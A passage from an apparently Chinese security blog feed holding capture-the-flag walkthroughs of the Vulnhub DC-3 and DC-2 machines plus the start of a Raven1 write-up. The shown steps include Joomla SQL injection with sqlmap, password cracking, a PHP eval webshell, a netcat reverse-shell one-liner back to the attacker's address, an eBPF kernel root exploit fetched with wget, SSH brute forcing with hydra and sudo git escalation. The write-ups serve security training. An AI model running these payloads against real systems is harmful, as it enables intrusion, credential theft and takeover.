requirements. Networking is configured for DHCP.</p><p>Installation is simple - download it, unzip it, and then import it into VirtualBox and away you go.</p><p>IMPORTANT</p><p>While there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.</p><p>In saying that, there shouldn’t be any problems, but I feel the need to throw this out there just in case.</p><p>CONTACT</p><p>I’m also very interested in hearing how people go about solving these challenges, so if you’re up for writing a walkthrough, please do so and send me a link, or alternatively, follow me on Twitter, and DM me (you can unfollow after you’ve DM’d me if you’d prefer).</p><p>I can be contacted via Twitter - @DCAU7</p><p>This works better with VirtualBox rather than VMware ## Changelog v3.2 - 2020-04-25 v3.0 - 2019-03-26</p><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-发现主机"><a href="#1-发现主机" class="headerlink" title="1.发现主机"></a>1.发现主机</h3><p>使用命令如下，如下图，发现了我们的靶机</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0331/netdis.png"></p><hr><h3 id="2-扫描主机"><a href="#2-扫描主机" class="headerlink" title="2.扫描主机"></a>2.扫描主机</h3><p>使用namp工具扫描，命令如下，如下图，发现了没有怎么开放端口，就开放了一个80端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -O -p <span class="token number">0</span>-65535 <span class="token number">192.168</span>.1.35<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0331/nmap.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>既然是开放了<code>80</code>端口，那么肯定是网站，网站那么二话不说直接先扫描目录，命令如下，如下图发现了很多目录，初步判断是<code>joomla</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.1.35<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0331/dirb.png"></p><hr><h3 id="4-网页信息收集"><a href="#4-网页信息收集" class="headerlink" title="4.网页信息收集"></a>4.网页信息收集</h3><p>如下图，直接访问IP地址，左边的红色圈圈说的是，要拿到root权限，只有一个flag，右边的圈圈是猜想这里是登录点，也是突破点。</p><p><img src="/images/wordimage/2022/0331/denglu.png"></p><p>然后经过一番查找，看源代码，看网络传输，看抓包，并没有，发现什么，但是经过上面目录扫描，访问<code>/administrator</code>验证，就是joomla框架，如下图。</p><p><img src="/images/wordimage/2022/0331/joomla.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-joomlaSQL注入漏洞"><a href="#1-joomlaSQL注入漏洞" class="headerlink" title="1.joomlaSQL注入漏洞"></a>1.joomlaSQL注入漏洞</h3><p>使用工具<code>joomlascan</code>，这个工具类似于<code>wpscan</code>，但是joomlascan是专门用来扫描joomla框架的，wpscan用来扫描wordpress，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">joomlascan --url <span class="token number">192.168</span>.1.35<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果如下图，发现了joomla版本和后台地址，既然发现了版本，肯定要先看一看这个版本有什么东西。</p><p><img src="/images/wordimage/2022/0331/joomlascan.png"></p><p>使用命令如下，搜索joomla 3.7.0版本漏洞。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit joomla <span class="token number">3.7</span>.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现有一个sql注入漏洞。</p><p><img src="/images/wordimage/2022/0331/SQLjoomla.png"></p><p>我们把文档复制到桌面查看，命令如下，内容也如下图。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/php/webapps/42033.txt ./Desktop/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现有手工注入和sqlmap注入。</p><p><img src="/images/wordimage/2022/0331/sqlmap.png"></p><p>这里使用sqlmap，来进行注入，我使用的是windows环境下的sqlmap，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py -u <span class="token string">"http://192.168.1.35/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk<span class="token operator">=</span><span class="token number">3</span> --level<span class="token operator">=</span><span class="token number">5</span> --random-agent --dbs -p list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，成功爆出全部数据库</p><p><img src="/images/wordimage/2022/0331/databases.png"></p><p>使用命令如下，可以爆出后台用户密码，只不过被加密了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py -u <span class="token string">"http://192.168.1.35/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk<span class="token operator">=</span><span class="token number">3</span> --level<span class="token operator">=</span><span class="token number">5</span> --random-agent -D joomladb -T <span class="token comment">#__users -C username,password --dump -p list[fullordering]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0331/password.png"></p><h3 id="2-使用john工具进行密码破解"><a href="#2-使用john工具进行密码破解" class="headerlink" title="2.使用john工具进行密码破解"></a>2.使用john工具进行密码破解</h3><p>然后这里可以使用kali自带的john工具，命令如下。</p><p>创建密码本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> pass.txt<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>破解密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john pass.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于我破解过了，所以没有显示出来（ 其实是破解了之后忘了截图然后clean了），所以我这里使用<code>john --show pass.txt</code>来查看，上一次破解成功之后的密码，如下图。</p><p><img src="/images/wordimage/2022/0331/snoopy.png"></p><blockquote><p>账户：admin</p><p>密码：snoopy</p></blockquote><hr><h3 id="3-写入WEBSHELL木马"><a href="#3-写入WEBSHELL木马" class="headerlink" title="3.写入WEBSHELL木马"></a>3.写入WEBSHELL木马</h3><p>上面破解出来的密码，我们找到后台登录进去(上面信息收集也发现了)。登录页面<code>http://192.168.1.35/administrator</code>。</p><p>像<code>wordpress</code>写入木马是找到模板写入，那么joomla应该也是，所以找到模板文件，看下面图片红色箭头操作流程即可。</p><p><img src="/images/wordimage/2022/0331/Templates.png"></p><p><img src="/images/wordimage/2022/0331/Beez3.png"></p><p><img src="/images/wordimage/2022/0331/NewFile.png"></p><p>这里要说一下，如下图，shell，不需要加php的后缀我尝试的时候加了后缀不行，然后后面选择php文件即可，然后点击<code>create</code>。</p><p><img src="/images/wordimage/2022/0331/shellphp.png"></p><p>然后就可以写入一句话木马，代码如下。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>pass<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，写入成功，然后右上角<code>Save</code>保存，需要注意的是左边的红色下划线，提示的是我们的shell文件在<code>/templates/beez3/shell.php</code>，正常人肯定都这么想，那么templates目录在哪呢？就在网站根目录下，上面信息收集目录扫描已经发现了，所以shell地址是: <code>http://192.168.1.35/templates/beez3/shell.php</code></p><p><img src="/images/wordimage/2022/0331/webshell.png"></p><p>我们使用蚁剑来连接，发现连接成功，然后进入shell命令控制台即可，如下图。</p><p><img src="/images/wordimage/2022/0331/success.png"></p><p><img src="/images/wordimage/2022/0331/termun.png"></p><hr><h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><p>这里我查看了<code>/etc/passwd</code>，和sudo命令还有home目录下面还有tmp目录下面都没有发现可利用的点，但是在查看系统内核版本的时候，发现了系统是<code>16.0.4</code>版本的乌班图，这个版本的乌班图是有本地提权的漏洞的，并且漏洞编号是<code>CVE-2017-16995</code>，下面的话是漏洞描述。</p><blockquote><p>Ubuntu最新版本16.04存在<strong>本地提权</strong>漏洞，该漏洞存在于Linux内核带有的eBPF bpf(2)系统调用中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题。 </p></blockquote><p>如下图，查看的系统版本。</p><p><img src="/images/wordimage/2022/0331/16.04.png"></p><p>回到KALI，我们搜索一下这个版本，命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit Ubuntu <span class="token number">16.04</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，这里使用的是红色箭头的exp，描述也和上面所写一样。</p><p><img src="/images/wordimage/2022/0331/loudong.png"></p><p>把文档复制到桌面打开，如下命令复制到桌面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/39772.txt ./Desktop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开文档，文档拉到最下面，是EXP的下载地址，如下图。</p><p><img src="/images/wordimage/2022/0331/exploit.png"></p><p>下面是下载链接，我们在靶机上面下载即可。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在靶机下载exp即可，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是如果就这样下载会报错，如下图报错，然后按照网上的解决办法👉<a href="https://blog.csdn.net/m0_64362956/article/details/121596760">解决出现“raw.githubusercontent.com (raw.githubusercontent.com)|::|:443… 失败：拒绝连接。“问题</a>，但是我试了很多IP都不行，最终解决是我魔法上网，然后下载，用蚁剑传输到了靶机里面，很魔幻。</p><p><img src="/images/wordimage/2022/0331/bunengxiazai.png"></p><p>之后就可以解压运行了，命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> <span class="token number">39772</span>.zip <span class="token comment">#解压文件</span><span class="token builtin class-name">cd</span> <span class="token number">39772</span><span class="token function">tar</span> -xvf exploit.tar <span class="token comment">#解压exploit.tar文件</span><span class="token builtin class-name">cd</span> ebpf_mapfd_doubleput_exploit<span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/wordimage/2022/0331/tar.png"></p><p>然后编译文件，里面就只有一个sh文件可以运行。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./compile.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行了之后有警告，可以忽略。</p><p><img src="/images/wordimage/2022/0331/compile.png"></p><p>然后就可以执行提权文件，来进行提权，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./doubleput <span class="token comment">#执行提权</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果你和我一样，提权失败了，但是没有完全失败的问题，如下图，可以这样解决，按照正常流程，这样就直接提权到了root里面就可以结束了。</p><p><img src="/images/wordimage/2022/0331/tiquanshibai.png"></p><h3 id="1-解决提权失败的问题"><a href="#1-解决提权失败的问题" class="headerlink" title="1.解决提权失败的问题"></a>1.解决提权失败的问题</h3><p>经过查询资料 （百度），好像是说，蚁剑的连接不行，需要用到，反弹shell的方法可以成功我也不知道为什么可以，就离谱。</p><p>重新操作流程，在joomla的后台模板的地方重新写入代码，代码如下。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 192.168.1.18 6666 >/tmp/f'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，重新在后台写入了文件。</p><p><img src="/images/wordimage/2022/0331/remake.png"></p><p>之后在kali里面开启监听，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lnvp <span class="token number">6666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，成功开启了监听。</p><p><img src="/images/wordimage/2022/0331/nc.png"></p><p>最后再去访问，地址，然后就可以了，如下图，反弹shell成功。</p><p><img src="/images/wordimage/2022/0331/ncshell.png"></p><p><img src="/images/wordimage/2022/0331/ncsucc.png"></p><p>之后就可以回到上面的目录，执行提权操作即可，如下图，提权成功是root，红色箭头指的是，输入的命令。</p><p><img src="/images/wordimage/2022/0331/tiquanchenggong.png"></p><p>然后我们去root目录查看最终flag即可，如下图。</p><p><img src="/images/wordimage/2022/0331/flag.png"></p><p>结束！</p><hr><h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>第一个知识盲区是，为什么换成反弹shell就可以成功提权，需要我后续仔细查资料，然后joomla框架的漏洞，然后john破解密码工具。</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-2靶机实战</title>
      <link href="/2022/0353b6c953.html"/>
      <url>/2022/0353b6c953.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p><blockquote><p>​    KALI地址：192.168.1.18</p><p>​    靶机地址：192.168.1.33</p></blockquote><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-发现主机"><a href="#1-发现主机" class="headerlink" title="1.发现主机"></a>1.发现主机</h3><p>使用命令如下，如下图，这里发现了靶机IP地址。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0328/netdiscover.png"></p><hr><h3 id="2-扫描主机"><a href="#2-扫描主机" class="headerlink" title="2.扫描主机"></a>2.扫描主机</h3><p>使用命令如下，发现了主机开放了<code>80</code>和<code>7744</code>端口其中<code>7744</code>是SSH连接端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -O -p <span class="token number">0</span>-65535 <span class="token number">192.168</span>.1.33<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0328/SSHandWEB.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>既然是网站，那么肯定是，有网站目录的，那么先二话不说直接扫描，使用命令，如下，并且如下图，发现是wordpress站点。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.1.33<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0328/wordpress.png"></p><hr><h3 id="4-网页信息挖掘"><a href="#4-网页信息挖掘" class="headerlink" title="4.网页信息挖掘"></a>4.网页信息挖掘</h3><h4 id="4-1-解决不能访问的问题"><a href="#4-1-解决不能访问的问题" class="headerlink" title="4.1.解决不能访问的问题"></a>4.1.解决不能访问的问题</h4><p>我们直接访问网站，发现重定向了到了一个域名，我们访问不了，如下图，访问IP地址会跳转到这个地址</p><p><img src="/images/wordimage/2022/0328/dc-2.png"></p><p>解决办法如下，在KALI里面打卡<code>cat /etc/hosts</code>文件，然后如下图设置即可</p><p><img src="/images/wordimage/2022/0328/hosts.png"></p><p>然后我们再次访问，就可以了，如下图访问成功。</p><p><img src="/images/wordimage/2022/0328/dc-2succ.png"></p><hr><h4 id="4-2-挖掘wordpress用户"><a href="#4-2-挖掘wordpress用户" class="headerlink" title="4.2.挖掘wordpress用户"></a>4.2.挖掘wordpress用户</h4><p>既然是wordpress框架，肯定少不了<code>wpscan</code>的扫描，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan --url http://dc-2 -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描结果如下图，发现了<code>admin,jerry,tom</code>用户。</p><p><img src="/images/wordimage/2022/0328/wordpressusers.png"></p><hr><h4 id="4-3-挖掘第一个flag"><a href="#4-3-挖掘第一个flag" class="headerlink" title="4.3.挖掘第一个flag"></a>4.3.挖掘第一个flag</h4><p>经过深度挖掘，看源代码，看URL地址，查看网络文件，均没有发现东西，但是在flag这行里面发现了东西，如下图。</p><p><img src="/images/wordimage/2022/0328/flag1.png"></p><p>然后翻译如下，发现是叫我们使用<code>cewl</code>这个工具，cewl这个工具的作用是生成密码，用深度爬虫来分析网站生成密码。</p><p><img src="/images/wordimage/2022/0328/cewl.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-暴力破解wordpress"><a href="#1-暴力破解wordpress" class="headerlink" title="1.暴力破解wordpress"></a>1.暴力破解wordpress</h3><p>经过第一个flag提示，我们使用cewl工具来生成密码，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl dc-2 -w dict.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这句话的意思是什么呢？网站是dc-2，然后-w，把分析出来的密码，写入dict.txt里面去。</p><p>然后在加上上面我们挖掘出来的wordpress用户，我们可以把<code>admin,jerry,tom</code>写入用户本里面去，如下图。</p><p><img src="/images/wordimage/2022/0328/dict.png"></p><p>然后我们就可以使用<code>wpscan</code>来暴力破解wordpress后台密码，命令如下，并且如下图成功。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan --url http://dc-2 -P dict.txt -U user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0328/wordpressusersucc.png"></p><blockquote><p>账户：jerry</p><p>密码：adipiscing</p></blockquote><blockquote><p>账户：tom</p><p>密码：parturient</p></blockquote><p>就发现了两个用户，然后我们就可以尝试登录后台，根据上面目录扫描发现后台地址是<code>/wp-admin</code>，首先尝试的是jerry账户，我们在文章栏里面发现了第二个flag如下图。</p><p><img src="/images/wordimage/2022/0328/flag2.png"></p><p><img src="/images/wordimage/2022/0328/flag2-1.png"></p><p>谷歌翻译一下，看看，翻译如下，意思是wordpress没有可以利用的点了，确实是这样，我还想找地方写一句话木马，结果没有写入点。</p><p><img src="/images/wordimage/2022/0328/OKwordpress.png"></p><hr><h3 id="2-暴力破解ssh"><a href="#2-暴力破解ssh" class="headerlink" title="2.暴力破解ssh"></a>2.暴力破解ssh</h3><p>既然wordpress没有可以利用的地方了，还有一个ssh连接点，经过测试，可以使用wordpress的账户和密码登录ssh，但是只有tom这个用户可以登录，但是如果猜想不对的话，可以暴力破解，这里暴力破解使用的工具是<code>hydra</code>，命令如下。</p><blockquote><p>-L 用户字典</p><p>-P 密码字典</p><p>-s 指定端口</p><p>-vV 显示详细破解信息</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L user.txt -P dict.txt -s <span class="token number">7744</span> ssh://192.168.1.33 -vV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，破解成功。</p><p><img src="/images/wordimage/2022/0328/sshtom.png"></p><hr><h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><p>直接ssh连接靶机，即可，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -p <span class="token number">7744</span> tom@192.168.1.33<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，连接成功，</p><p><img src="/images/wordimage/2022/0328/sshtomtom.png"></p><p>经过，尝试，发现，很多命令不能用，所以我们直接查看环境变量，看看能用的命令，如下图，顺便发现了第三个flag，但是不能使用cat命令查看，而且查看，能使用的命令是<code>less    ls        scp        vi</code></p><p><img src="/images/wordimage/2022/0328/findecho.png"></p><p>命令全部如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tom@DC-2:~$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>/home/tom/usr/bintom@DC-2:~$ <span class="token function">ls</span>flag3.txt  <span class="token builtin class-name">test</span>  usrtom@DC-2:~$ <span class="token function">ls</span> usr/bin<span class="token function">less</span>  <span class="token function">ls</span>  <span class="token function">scp</span>  <span class="token function">vi</span>tom@DC-2:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们可以尝试绕过，按照如下命令输入即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tom@DC-2:~$ <span class="token environment constant">BASH_CMDS</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">=</span>/bin/sh<span class="token punctuation">;</span>a$ /bin/bashtom@DC-2:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/bin/tom@DC-2:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后就可以查看第三个flag，如下图。</p><p><img src="/images/wordimage/2022/0328/flag3.png"></p><p>翻译过来如下。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">可怜的老汤姆总是追着杰瑞跑。 也许他应该为他造成的所有压力感到不安<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试了tom的很多命令，比如sudo -l用不了，那这样我们切换到jerry账户，上面没有破解成功，应该是不让远程登录。</p><blockquote><p>用户：jerry</p><p>密码：adipiscing</p></blockquote><p>然后登录成功，在jerry的家目录下面发现了第四个flag，如下图。</p><p><img src="/images/wordimage/2022/0328/jerry.png"></p><p>内容如下。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Good to see that you've made it this far - but you're not home yet. You still need to get the final flag (the only flag that really counts!!!).  No hints here - you're on your own now.  :-)Go on - git outta here!!!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后，这里使用命令<code>sudo -l</code>查看有那些sudo命令，发现可以使用git命令提权。</p><p><img src="/images/wordimage/2022/0328/jerrysudo-l.png"></p><p>GIT提权可以看这个文章👉<a href="https://www.freebuf.com/articles/system/261271.html">GIT提权原理</a>。</p><p>使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> <span class="token builtin class-name">help</span> <span class="token function">add</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后输入<code>!/bin/bash</code>，就可以完成提权了。</p><p><img src="/images/wordimage/2022/0328/bash.png"></p><p><img src="/images/wordimage/2022/0328/root.png"></p><p>然后就可以查看最后一个flag就可以了，如下图。</p><p><img src="/images/wordimage/2022/0328/flag5.png"></p><hr><h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>绕过命令限制可以使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tom@DC-2:~$ <span class="token environment constant">BASH_CMDS</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">=</span>/bin/sh<span class="token punctuation">;</span>a$ /bin/bashtom@DC-2:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/bin/tom@DC-2:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后新的暴力破解方法，<code>hydra</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L user.txt -P dict.txt -s <span class="token number">7744</span> ssh://192.168.1.33 -vV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-Raven1靶机实战</title>
      <link href="/2022/03cd35d52.html"/>
      <url>/2022/03cd35d52.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>下载地址：<a href="https://www.vulnhub.com/entry/raven-1,256/">https://www.vulnhub.com/entry/raven-1,256/</a></p><blockquote><p>KALI地址：192.168.1.18</p><p>靶机地址：192.168.1.31</p></blockquote><p>描述如下</p><p>Description</p><p><a href="https://www.vulnhub.com/entry/raven-1,256/#top">Back to the Top</a></p><p>Raven is a Beginner/Intermediate boot2root machine. There are four flags to find and two intended ways of getting root. Built with VMware and tested on Virtual Box. Set up to use NAT networking.</p><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用命令如下，发现了靶机地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.1.31<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0324/netdis.png"></p><hr><h3 id="2-扫描主机"><a href="#2-扫描主机" class="headerlink" title="2.扫描主机"></a>2.扫描主机</h3><p>这里使用了两个命令，如下，扫描了两次。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sV <span class="token number">192.168</span>.1.31nmap -A -T4 -O -p <span class="token number">0</span>-65535 <span class="token number">192.168</span>.1.31<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如下图结果，发现扫描出了<code>22,80,111,59433</code>端口分别对应的是<code>ssh</code>，<code>web</code>,<code>rpc</code>服务。</p><p><img src="/images/wordimage/2022/0324/nmap.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>既然有web服务那就必须先来一通目录扫描了使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.1.31<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，所示，扫描出的目录，红色箭头是我自我感觉需要注意的目录</p><p><img src="/images/wordimage/2022/0324/dirb.png"></p><hr><h4 id="3-1manual目录"><a href="#3-1manual目录" class="headerlink" title="3.1manual目录"></a>3.1manual目录</h4><p>发现是apache目录，没有什么利用价值，如下图</p><p><img src="/images/wordimage/2022/0324/apache.png"></p><hr><h4 id="3-2vendor目录"><a href="#3-2vendor目录" class="headerlink" title="3.2vendor目录"></a>3.2vendor目录</h4><p>如下图，发现是有一堆文件。</p><p><img src="/images/wordimage/2022/0324/vendor.png"></p><p>经过一番查找和搜寻，发现了几个信息，第一个在<code>README.md</code>文件里面，发现网站安装了<code>PHPMailer</code>，其中在<code>VERSION</code>文件里面发现了<code>PHPMailer</code>版本号，如下两张图，PHPMailer版本小于<code>5.2.18</code>是有重大漏洞的。</p><p><img src="/images/wordimage/2022/0324/phpmailer.png" alt="发现PHPMailer"></p><p><img src="/images/wordimage/2022/0324/phpmailerversion.png" alt="发现PHPMailer版本"></p><hr><h4 id="3-3wordpress目录"><a href="#3-3wordpress目录" class="headerlink" title="3.3wordpress目录"></a>3.3wordpress目录</h4><p>就是wordpress博客，万一可以从里面进去写入一句话木马呢？或者其他有用的信息。</p><p><img src="/images/wordimage/2022/0324/wordpress.png"></p><p>既然是wordpress，可以用wpscan来扫一波有那些账户室友命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan --url http://192.168.1.31/wordpress -e u <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图扫出来两个账户，一个是<code>michael</code>和<code>steven</code>。</p><p><img src="/images/wordimage/2022/0324/wordpresszhanghu.png"></p><p>然后在做信息收集的时候在<code>service.html</code>查看源代码的时候发现了flag，原来这个靶机是找flag吗 （恼。</p><p><img src="/images/wordimage/2022/0324/flag1.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-PHPMailer漏洞"><a href="#1-PHPMailer漏洞" class="headerlink" 